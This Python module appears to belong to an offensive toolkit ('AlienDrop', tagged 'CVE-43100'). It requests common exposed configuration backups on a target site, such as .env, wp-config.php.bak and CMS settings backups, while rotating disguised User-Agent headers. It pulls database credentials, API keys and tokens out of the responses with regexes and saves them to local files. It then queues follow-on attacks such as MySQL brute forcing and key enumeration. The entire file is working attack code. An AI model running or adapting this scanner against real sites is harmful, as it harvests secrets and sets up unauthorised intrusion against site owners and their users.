import os
import json
import requests
import re
from datetime import datetime

DEFAULT_VULN_PATHS = [
    "/.env",
    "/config/config.json",
    "/wp-config.php.bak",
    "/wp-config.old.php",
    "/admin/.env",
    "/site/settings.php.bak",
    "/dede/config.php.bak"
]

HEADERS_ROTATION = [
    {"User-Agent": "Mozilla/5.0 (AlienDrop/Recon1)"},
    {"User-Agent": "curl/7.85.0"},
    {"User-Agent": "Mozilla/5.0", "Accept": "*/*"},
    {"User-Agent": "AlienDrop/LeakScan"}
]

PATTERNS = {
    "db_creds": re.compile(r"DB_(HOST|NAME|USER|PASSWORD|PASS|PORT)\s*=\s*[\"']?([\w\.-]+)", re.I),
    "env_vars": re.compile(r"([A-Z_]+)\s*=\s*[\"']?.{4,}", re.I),
    "api_keys": re.compile(r"(API_KEY|SECRET_KEY|TOKEN)[\"'\s=:\[]+([\w\-]{10,})", re.I)
}


def extend_paths_by_cms(cms_name):
    if not cms_name:
        return []
    cms_paths = {
        "wordpress": ["/wp-config.php~", "/wp-config.php.save", "/wp-config.backup"],
        "dedecms": ["/data/config.cache.inc.bak", "/dede/config.php.bak"],
        "joomla": ["/configuration.php.bak", "/admin/config.php.old"],
        "drupal": ["/sites/default/settings.php.bak"]
    }
    return cms_paths.get(cms_name.lower(), [])


def classify_leak(content):
    findings = {}
    for tag, pattern in PATTERNS.items():
        matches = pattern.findall(content)
        if matches:
            findings[tag] = list(set(m[1] for m in matches if len(m) > 1))
    return findings


def save_leak_log(target, data):
    os.makedirs("output/leaks", exist_ok=True)
    with open(f"output/leaks/{target}_leaks.json", "w") as f:
        json.dump(data, f, indent=2)


def run(target, recon_data=None):
    print(f"[CVE-43100] Scanning {target} for leaked config files...")

    discovered = {}
    suggestions = []
    flags = []
    all_paths = list(DEFAULT_VULN_PATHS)

    if recon_data and isinstance(recon_data.get("cms"), dict):
        cms_name = recon_data["cms"].get("cms")
        all_paths.extend(extend_paths_by_cms(cms_name))

    for path in all_paths:
        url = f"http://{target}{path}"
        headers = HEADERS_ROTATION[len(path) % len(HEADERS_ROTATION)]

        try:
            r = requests.get(url, headers=headers, timeout=4)
            if r.status_code == 200 and ("DB_" in r.text or "API_KEY" in r.text or "=" in r.text[:80]):
                text = r.text[:1000]
                sample = text.splitlines()[0][:200]
                classified = classify_leak(text)

                print(f"[CVE-43100] Leak found: {path} → {', '.join(classified.keys()) or 'untyped'}")
                discovered[path] = {
                    "sample": sample,
                    "classified": classified
                }

                if "db_creds" in classified:
                    suggestions.append("mysql_brute")
                    flags.append("can_enum_mysql")
                if "api_keys" in classified:
                    suggestions.append("key_enum")
                if path.endswith(".bak") or ".old" in path:
                    flags.append("has_backup_disclosure")
                if "wp-config" in path:
                    flags.append("exploit_priority")

        except Exception:
            continue

    if discovered:
        leak_data = {
            "target": target,
            "timestamp": datetime.utcnow().isoformat(),
            "leaks": discovered,
            "suggested_tasks": list(set(suggestions)),
            "flags": list(set(flags)),
            "status": "vulnerable"
        }
        save_leak_log(target, leak_data)
        return leak_data

    print("[CVE-43100] No leaks detected.")
    return {
        "target": target,
        "leaks": {},
        "status": "clean"
    }

